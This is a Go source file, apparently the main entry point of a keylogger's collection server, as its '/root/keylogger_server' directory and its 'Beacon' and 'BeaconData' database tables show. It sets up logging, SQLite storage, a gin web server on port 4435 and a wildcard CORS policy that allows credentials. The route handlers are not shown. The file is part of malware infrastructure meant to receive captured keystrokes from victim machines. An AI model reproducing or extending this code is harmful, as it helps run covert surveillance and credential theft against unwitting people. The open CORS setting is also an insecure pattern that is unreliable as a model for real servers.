package main

import (
	"LogServer/database"
	"LogServer/utilities"
	"fmt"
	"github.com/gin-gonic/gin"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
	"os"
	"path/filepath"
)

const (
	DB  = "server.db"
	LOG = "server.log"
	//HOMEDIR = "C:\\ProgramData" // Windows
	HOMEDIR = "/root/keylogger_server" // Linux
)

var (
	db *gorm.DB
	//r  *gin.Engine
)

func init() {
	exist := utilities.Filexists(HOMEDIR)
	if exist {
		fmt.Printf("has dir![%v]\n", HOMEDIR)
	} else {
		fmt.Printf("no dir![%v]\n", HOMEDIR)
		// 创建文件夹
		err := os.Mkdir(HOMEDIR, os.ModePerm)
		if err != nil {
			fmt.Printf("mkdir failed![%v]\n", err)
		} else {
			fmt.Printf("mkdir success!\n")
		}
	}

	utilities.InitLog(filepath.Join(HOMEDIR, LOG))
	initDB()
}

func main() {
	// logger and recovery (crash-free) middleware
	r := gin.Default()
	r.Use(CORSMiddleware())
	setRoutes(r)
	r.Run(":4435")
}

func CORSMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {

		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Access-Control-Allow-Credentials", "true")
		c.Header("Access-Control-Allow-Headers", "Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization, accept, origin, Cache-Control, X-Requested-With")
		c.Header("Access-Control-Allow-Methods", "POST,HEAD,PATCH, OPTIONS, GET, PUT")

		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}

		c.Next()
	}
}

func initDB() {
	sqlite3Conn(filepath.Join(HOMEDIR, DB))
	db.AutoMigrate(&database.Beacon{})
	db.AutoMigrate(&database.BeaconData{})
}

// 连接到sqlite3数据库
func sqlite3Conn(path string) {
	var err error
	db, err = gorm.Open(sqlite.Open(path), &gorm.Config{})
	if err != nil {
		panic(err)
	}
}
